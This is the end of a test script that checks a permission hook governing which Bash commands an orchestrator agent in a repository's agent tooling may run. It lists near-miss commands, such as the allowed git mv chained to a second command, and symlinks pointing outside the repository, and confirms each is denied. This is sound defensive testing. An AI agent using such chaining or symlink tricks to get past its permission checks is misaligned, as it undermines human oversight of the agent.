    "git mv agentTooling/self/orchestrations/%s plans/orchestrations/%s" % (COORD_SLUG, COORD_SLUG),
    "git mv agentTooling/self/orchestrations/%s plans/orchestrations/other" % RECORD_SLUG,
    "git mv agentTooling/self/orchestrations/%s plans/%s" % (RECORD_SLUG, RECORD_SLUG),
    "git mv -f agentTooling/self/orchestrations/%s plans/orchestrations/%s" % (RECORD_SLUG, RECORD_SLUG),
    "git mv agentTooling/self/orchestrations/%s plans/orchestrations/%s extra" % (RECORD_SLUG, RECORD_SLUG),
    "git mv agentTooling/self/orchestrations/%s/README.md plans/orchestrations/%s" % (RECORD_SLUG, RECORD_SLUG),
    "git mv ./agentTooling/self/orchestrations/%s plans/orchestrations/%s" % (RECORD_SLUG, RECORD_SLUG),
    "git mv agentTooling/hooks/allow-repo-commands.sh plans/x.sh",
    "git mv agentTooling/self/orchestrations plans/orchestrations",
    "git mv agentTooling/self/orchestrations/%s" % RECORD_SLUG,
    "git -C . mv agentTooling/self/orchestrations/%s plans/orchestrations/%s" % (RECORD_SLUG, RECORD_SLUG),
]
for profile in PROFILES:
    decision, reason = bash("consumer", profile, OWN_MOVE, SESSION_S)
    check("H28 [consumer/%s] the orchestrator's move of its own record is approved" % profile,
          decision == ALLOW, "%s: %s" % (decision, reason))
    decision, reason = bash("consumer", profile, OWN_MOVE + " && ls", SESSION_S)
    check("H28 [consumer/%s] ... but not approved outright beside another command" % profile,
          decision != ALLOW, "%s: %s" % (decision, reason))
    for command in OTHER_MOVES:
        decision, reason = bash("consumer", profile, command, SESSION_S)
        check("H28 [consumer/%s] %r from the orchestrator is the allowlist denial" % (profile, command),
              decision == DENY and ALLOWLIST_MARK in reason, "%s: %s" % (decision, reason))
    decision, reason = bash_at("consumer", profile, OWN_MOVE, SESSION_S, os.path.join(CONSUMER, "agentTooling"))
    check("H28 [consumer/%s] ... and from any directory but the consuming repo's root" % profile,
          decision == DENY and ALLOWLIST_MARK in reason, "%s: %s" % (decision, reason))
    decision, reason = bash("self", profile, "git mv self/orchestrations/%s plans/orchestrations/%s"
                            % (RECORD_SLUG, RECORD_SLUG), SESSION_S)
    check("H28 [self/%s] a standalone checkout's record is never moved" % profile,
          decision == DENY and ALLOWLIST_MARK in reason, "%s: %s" % (decision, reason))
    decision, reason = bash("consumer", profile, OWN_MOVE, SESSION_T)
    check("H28 [consumer/%s] another session's same move is not approved outright" % profile,
          decision != ALLOW, "%s: %s" % (decision, reason))
os.makedirs(os.path.join(CONSUMER, "plans", "orchestrations", RECORD_SLUG), exist_ok=True)
decision, reason = bash("consumer", "cloud", OWN_MOVE, SESSION_S)
check("H28 [consumer/cloud] a destination already there is the allowlist denial",
      decision == DENY and ALLOWLIST_MARK in reason, "%s: %s" % (decision, reason))
os.rmdir(os.path.join(CONSUMER, "plans", "orchestrations", RECORD_SLUG))
# Round 2 (round 1's review): git tracks no empty directory, so `plans/orchestrations/` is
# usually absent; the remedy LEGACY_RECORD_MOVE prints leads with `mkdir -p`, approved whole
PLANS = os.path.join(CONSUMER, "plans")
PLANS_ASIDE = os.path.join(TMP, "plans-aside")
shutil.move(PLANS, PLANS_ASIDE)
sys.path.insert(0, os.path.join(AT, "hooks"))
import shared_rules  # noqa: E402
REMEDY = shared_rules.LEGACY_RECORD_MOVE.replace("{slug}", RECORD_SLUG)
MKDIR_NEAR_MISSES = [
    "mkdir -p plans/orchestrations ; " + OWN_MOVE,
    "mkdir -p plans/orchestrations || " + OWN_MOVE,
    "mkdir -p plans/x && " + OWN_MOVE,
    "mkdir plans/orchestrations && " + OWN_MOVE,
    "mkdir -p plans/orchestrations",
    "mkdir -p plans/orchestrations && " + OWN_MOVE + " && ls",
]
for profile in PROFILES:
    decision, reason = bash("consumer", profile, REMEDY, SESSION_S)
    check("H28 [consumer/%s] with no plans/, the printed remedy %r is approved" % (profile, REMEDY),
          decision == ALLOW, "%s: %s" % (decision, reason))
    for command in MKDIR_NEAR_MISSES:
        decision, reason = bash("consumer", profile, command, SESSION_S)
        check("H28 [consumer/%s] %r is not approved outright" % (profile, command),
              decision != ALLOW, "%s: %s" % (decision, reason))
# ... and it really moves the record once committed (git mv takes tracked files only)
GIT_ID = ["-c", "user.name=t", "-c", "user.email=t@example.com"]
subprocess.run(["git", "-C", CONSUMER, "add", "--", os.path.relpath(RECORD_C, CONSUMER)], check=True)
subprocess.run(["git", "-C", CONSUMER] + GIT_ID + ["commit", "-q", "-m", "record"], check=True)
moved = subprocess.run(["bash", "-c", REMEDY], cwd=CONSUMER, capture_output=True, text=True)
MOVED_RECORD = os.path.join(CONSUMER, "plans", "orchestrations", RECORD_SLUG, "README.md")
check("H28 the remedy, run with no plans/, moves the record into plans/orchestrations",
      moved.returncode == 0 and os.path.isfile(MOVED_RECORD) and not os.path.exists(RECORD_C),
      moved.stderr)
subprocess.run(["git", "-C", CONSUMER, "mv", os.path.relpath(os.path.dirname(MOVED_RECORD), CONSUMER),
                os.path.relpath(os.path.dirname(RECORD_C), CONSUMER)], check=True)
shutil.rmtree(PLANS)
# Round 2 (round 1's audit, M65/M66/M72): a symlinked `plans` or `plans/orchestrations` would
# take the record outside the repository — never approved
OUTSIDE = os.path.join(TMP, "outside")
os.makedirs(os.path.join(OUTSIDE, "orchestrations"))
os.symlink(OUTSIDE, PLANS)
for command in (OWN_MOVE, REMEDY):
    decision, reason = bash("consumer", "cloud", command, SESSION_S)
    check("H28 with plans a symlink outside the repo, %r is not approved" % command,
          decision != ALLOW, "%s: %s" % (decision, reason))
os.remove(PLANS)
os.makedirs(PLANS)
os.symlink(os.path.join(OUTSIDE, "orchestrations"), os.path.join(PLANS, "orchestrations"))
for command in (OWN_MOVE, REMEDY):
    decision, reason = bash("consumer", "cloud", command, SESSION_S)
    check("H28 with plans/orchestrations a symlink outside the repo, %r is not approved" % command,
          decision != ALLOW, "%s: %s" % (decision, reason))
shutil.rmtree(PLANS)
# M71: the record README a symlink to a file in ANOTHER folder holding S's fence — the move of
# that other folder (or of its own) is never approved
OTHER_DIR = os.path.join(os.path.dirname(os.path.dirname(RECORD_C)), "other")
os.makedirs(OTHER_DIR)
shutil.copy2(RECORD_C, os.path.join(OTHER_DIR, "R2"))
shutil.move(RECORD_C, RECORD_C + ".aside")
os.symlink(os.path.join("..", "other", "R2"), RECORD_C)
for command in ("git mv agentTooling/self/orchestrations/other plans/orchestrations/other", OWN_MOVE):
    decision, reason = bash("consumer", "cloud", command, SESSION_S)
    check("H28 with the record README a symlink into another folder, %r is not approved" % command,
          decision != ALLOW, "%s: %s" % (decision, reason))
os.remove(RECORD_C)
shutil.move(RECORD_C + ".aside", RECORD_C)
shutil.rmtree(OTHER_DIR)
shutil.move(PLANS_ASIDE, PLANS)

decision, reason = bash("self", "local", "./run-plans.sh x", SESSION_S)
check("H22 the allowlist denial names a separate session and says a subagent shares the Bash list",
      "SEPARATE session" in reason and "same Bash list" in reason, reason)

# H3 again, for a session with no record at all, and a tool the hook does not know
decision, _ = decode(run_hook(HOOK_C, CONSUMER, json.dumps(
    {"tool_name": "Read", "session_id": SESSION_S, "tool_input": {"file_path": "x"}}), "local"))
check("H3 a tool other than Bash and Agent prints nothing", decision == SILENT, decision)

sys.exit(1 if fails else 0)
PY
rc=$?
if (( rc == 0 )); then echo "hook-orchestrator-role: all checks passed"; else echo "hook-orchestrator-role: FAILED"; fi
exit "$rc"
